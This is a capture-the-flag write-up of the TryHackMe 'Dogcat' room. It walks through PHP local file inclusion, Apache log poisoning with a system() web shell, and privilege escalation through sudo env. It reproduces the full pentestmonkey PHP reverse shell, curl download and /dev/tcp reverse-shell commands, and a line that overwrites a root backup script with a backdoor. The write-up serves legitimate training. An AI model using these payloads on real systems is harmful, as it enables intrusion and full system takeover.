---
title: Dogcat - TryHackMe
date: 2020/07/11
categories:
  - [pentesting, writeups]
---

Hey there! Today I am going to walk you through the Dogcat machine on [TryHackMe](https://tryhackme.com/room/dogcat)

The first thing I always do is to export the IP to a global variable. So from now on \$IP will refer to the IP of the target machine.

```bash
export IP={Machine IP}
```

## Enumeration

So as always let’s start with an nmap scan.

```bash
nmap -sC -sV -oN nmap/initial
```

This is what came back:

```plain
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-10 06:27 EDT
Nmap scan report for 10.10.39.107
Host is up (0.045s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.88 seconds
```

So as we can see, there is a webserver on port 80 and a ssh access. We should first have a look at the webserver, as we can’t really do anything to the shh port at the moment.

## Gaining Access

We are greeted with a webpage about dog and cat pictures. If we click on one of the buttons we get either a picture of a dog or a cat respectively. On first glance there is no obvious entry point we could exploit, but if we have a look at the URL we should notice somehthing.

```bash
http://$IP/?view=dog
```

Once we clicked on a button the URL has a view parameter with “dog” or “cat” assigned. I instantly thought of Local File Inclusion (LFI), so let’s try something:

```bash
http://$IP/?view=..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd
```

But sadly the developer of the webpage took care of that and checks wether or not “dog” or “cat” is in the value of the view parameter, so once we write “dog” somewhere in the path, we see this:

{% asset_img lfi.png %}

Apparently warnings were not disabled in the php settings, so we can see that there was an error in the “include()” function. We can also see that the contents of the view parameter are being passed straight into that function, and that they automatically append a .php extension, somewhere in the code.

So what can we do with this information? We need to find a way to exfiltrate information from that webpage. I came accross [this](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/) website. Let’s try this:

{% asset_img lfi2.png %}

Awesome it worked!

Of course this is still base64, but we can easily decode that online for example [here](https://www.base64decode.org/).<br/>Just to recap, we used this URL:

```bash
http://$IP/?view=php://filter/convert.base64-encode/resource=./dog/../index
```

To show the code of the index page, encoded in base64. If we deocde this, we can see the source code of the index page, which let’s us see what is going on under the hood.

The exfiltrated code:

```php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

If you don’t know php, here is what it basically does:<br/>It checks if there is a “ext” parameter in the URL. If there is not, it uses a .php extension and else it uses whatever it was given in the URL. Then of course it includes whatever file is specified in the view parameter, with the given extension.

With this knowledge we can things like this:

```bash
http://10.10.39.107/?view=php://filter/resource=./dog/../../../../../../../etc/passwd&amp;ext=
```

To extraxt the linux password file:

```plain
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

Sadly we can not find any passwords or anything else interesting here, so we have to dig deeper.

The next thing we should try is log poisining. We are really just injecting a pice of php code into the log, to get remote code execution. Let’s first check where the log is. From our nmap scan we know that it is an apache2 server. So just try all the default locations. This is where I found it:

```bash
http://$IP/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=
```

This is a snippet of the log:

```plain
{YOUR_IP} - - [10/Jul/2020:10:27:35 +0000] "GET /cats/4.jpg HTTP/1.1" 200 17994 "http://$IP/?view=cat" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
```

It’s syntax is like this:

**{ACCESSING_IP} - - [TIME] “{REQUEST}” {RESPONSE_CODE} {I_DUNNO} “{URL}” “{USER_AGENT}”**

The part we can modify to display php code, is the User Agent.

You can either do this with a python script or with Burp-Suite.<br/>Here is the python script:

```python
import requests

url = 'http://$IP/?view=cat'

headers = {
    'User-Agent': '<?php system($_GET['cmd']); ?>',
}

response = requests.get(url, headers=headers)

print(response.text)
```

But I did it with Burp as well.

If you want a more detailed description just google how to edit a User Agent with Burp-Suite.

{% asset_img burp.png %}

We now have remote code execution, by passing a linux command to the “cmd” paramter in the URL. We can see the results of that command if we open up the log file again. So if we try to run “whoami” like this:

```bash
http://$IP/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=whoami
```

We can see this result in the logs (To find it more quickly the next time, copy the time stamp where the result of the whoami command showed up and search for it the next time. Then you will jump to the correct line automatically):

{% asset_img logpoisining.png %}

As expected we are “www-data”.

## Post Exploitation

### Flag 1

To get an overview of what we are working with let’s also run “ls -l”.

```bash
http://$IP/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=ls%20-l
```

{% asset_img flag1.png %}

Oh hey, there we have our first flag! We can see the content of the file like this:

```bash
http://$IP/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=cat%20flag.php
```

**It is in the current working directory (/var/www/html/)**

The result:

{% asset_img flag1.1.png %}

### Flag 2

The second flag is pretty much as easy as the first one, it is just one directory up.

**One up from the current directory (/var/www/)**

```bash
http://$IP/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=ls%20-l%20..
```

{% asset_img flag2.png %}

```bash
http://$IP/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=cat ../flag2_QMW7JvaY2LvK.txt
```

{% asset_img flag2.2.png %}

For the 3rd and 4th flag we will need a proper reverse shell with root access. I couldn’t get a shell by running a reverse shell from the [PentestMonkey-ReverseShell-CheatSheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), like this:

```bash
http://$IP/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=php -r '$sock=fsockopen("{TUN0}"",9999);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Maybe it was just me, but I decided to just download a php reverse shell from my computer with curl.

For that I used [this](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) reverse shell and modified it with my ip and the 9999 port.

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '';  // Your tun0 ip (ifconfig in terminal)
$port = 9999;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();

	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}

	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

Then I opened a http server in the directory I had the modified php shell:

```python
python -m http.server
```

Then download the file with curl:

```bash
http://$IP/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=curl -o shell.php {TUN0}:8000/shell.php
```

Before we open the file, we have to listen for incoming connection on the port we defined in the php shell on our machine:

```bash
nc -lnvp {PORT}
```

Then open the shell on the server:

```bash
http://$IP/shell.php
```

Sadly we can’t stabilize that shell with some poor mans pentest, because python is not installed.

## Getting Root

Let’s just run some code to see if there are some SUIDs we can run:

```bash
sudo -l
```

As you can see we can run /usr/bin/env with no password.

{% asset_img sudo.png %}

Give it a search on GTFOBins to see how we can get a root shell:

{% asset_img gtfobins.png %}

And there you go, you got a root shell!

{% asset_img whoamiroot.png %}

### Flag 3

The 3rd flag is in the **/root** directory. You can just cat it out, just like the previous ones.

{% asset_img flag3.png %}

### Flag 4

The problem with the 4th flag is, that it is outside of this container. This might sound confusing, but the essence is, is that we just have to get another shell.

In /opt/backups we can se that there is a backup script that is run regularly to generate a backup.tar file. Let’s use this to genreate another reverse shell outside of this container.

We can easily exploit, that this script is run every other minute with root privileges, by inserting some code that will generate a reverse connection to us.<br/>To insert this code into the script, simply run this:

```bash
echo "#!/bin/bash" > /opt/backups/backup.sh
echo "/bin/bash -c 'bash -i >& /dev/tcp/{TUN0}/8888 0>&1'" >> /opt/backups/backup.sh
```

And listen on port 8888 on your machine:

```bash
nc -lnvp 8888
```

Now wait a few seconds (or minutes, for me it took just a few seconds) and you get another root shell.

{% asset_img secondRootShell.png %}

The fourth flag is in **/root/flag4.txt**

{% asset_img flag4.png %}

## The End

And there you have it! I hope you had fun, I know I did 🦄
